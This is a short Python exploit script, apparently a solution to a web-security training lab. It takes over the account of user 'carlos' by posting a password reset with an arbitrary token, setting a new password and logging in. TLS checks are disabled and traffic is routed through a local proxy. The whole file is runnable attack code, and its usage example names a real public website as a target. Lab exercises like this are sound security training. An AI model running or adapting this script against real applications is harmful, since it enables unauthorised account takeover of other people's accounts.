import requests
import sys
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}


def access_carlos_account(s, url):

    # Reset carlos's password
    print("(+) Resetting carlos password ....")
    password_reset_url = url + 'forgot-password?temp-forgot-password-token=x'
    password_reset_data = {
        "temp-forgot-password-token": "x",
        "username": "carlos",
        "new-password-1": "win",
        "new-password-2": "win"
    }
    s.post(password_reset_url, data=password_reset_data, verify=False, proxies=proxies)

    # Access carlos's account
    print("(+) Logging into carlos account ....")
    login_url = url + 'login'
    login_data = {"username": "carlos", "password": "win"}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

    # Confirm exploit worked
    if "Log out" in r.text:
        print("(+) Successfully logged into carlos account")
    else:
        print("(+) Failed to log into carlos account")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv[0])
        print(" (+) Example: %s www.google.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)


if __name__ == '__main__':
    main()
